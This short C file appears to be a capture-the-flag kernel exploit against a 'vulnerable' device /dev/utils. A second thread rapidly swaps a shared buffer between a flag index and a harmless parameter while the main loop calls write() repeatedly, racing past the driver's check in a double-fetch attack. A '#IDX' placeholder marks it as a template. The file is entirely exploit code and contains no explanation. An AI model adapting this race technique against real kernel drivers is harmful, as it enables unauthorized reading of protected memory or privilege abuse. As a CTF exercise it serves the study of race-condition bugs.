#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>


long long idx;
int finish =0;
long long race_param=2;
long long *buf;

void bypass_check() {
  while (finish==0) {
    *buf = idx;
    // race is too strict, need to add race_param too
    *buf = race_param;
  }
}

int main() {

  // flag index
  idx = #IDX;
  buf = (long long *) malloc(0x10);

  setvbuf(stdin,0,2,0);
  setvbuf(stdout,0,2,0);
  setvbuf(stderr,0,2,0); 
  
  // open vuln device
  int fd = open("/dev/utils", O_RDWR);

  // race here
  pthread_t tid;
  pthread_create(&tid, NULL, (void *)bypass_check, NULL);
  *buf = race_param;
  for (int i=0; i<0x1000;i++) {
    write(fd, buf, 0xdeadbeef);
    *buf = race_param;
  }
  finish = 1;
  pthread_join(tid,NULL);
  close(fd);
  return 0;
}
